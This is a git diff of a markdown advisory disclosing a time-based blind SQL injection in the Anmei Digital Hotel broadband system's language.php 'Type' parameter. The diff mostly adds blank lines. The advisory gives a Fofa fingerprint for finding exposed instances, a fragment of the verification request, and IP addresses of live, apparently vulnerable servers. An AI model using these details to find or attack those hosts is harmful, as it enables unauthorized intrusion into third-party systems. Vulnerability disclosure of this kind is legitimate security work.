@@ -1,10 +1,15 @@
 **Time blind injection type SQL injection exists in the Anmei Digital Hotel broadband operation system**
 
 **Official website: http://www.amttgroup.com/**
+
 **Function point: At the editing interface of the language configuration page language. php**
+
 **Route: ip:port/language.php**
+
 **The injection parameter: Type**
+
 **Fofa syntax: icon_hash="1259797304"**
+
 **The vulnerability verification data packet is as follows**
 
 ```
@@ -80,6 +85,7 @@ EditStatus=1&LangEName=pHqghUme&LangID=1&LangName=pHqghUme&LangType=0000%E7%B3%B
 ```
 ![image.png](https://cdn.nlark.com/yuque/0/2023/png/36030634/1701499881158-e38995e4-a6be-4a54-bab1-5c51dec16a13.png#averageHue=%23f9f7f7&clientId=u95a6dc4b-efa8-4&from=paste&height=663&id=u1b78ab13&originHeight=829&originWidth=1580&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=386822&status=done&style=none&taskId=u25a2cfad-42ec-4257-9c34-503246b9283&title=&width=1264)
 **Other cases of vulnerabilities:**
+
 [https://183.62.208.100:7070/manager/login.php](https://183.62.208.100:7070/manager/login.php)
 
 [https://61.185.56.165:7080/manager/login.php](https://61.185.56.165:7080/manager/login.php)
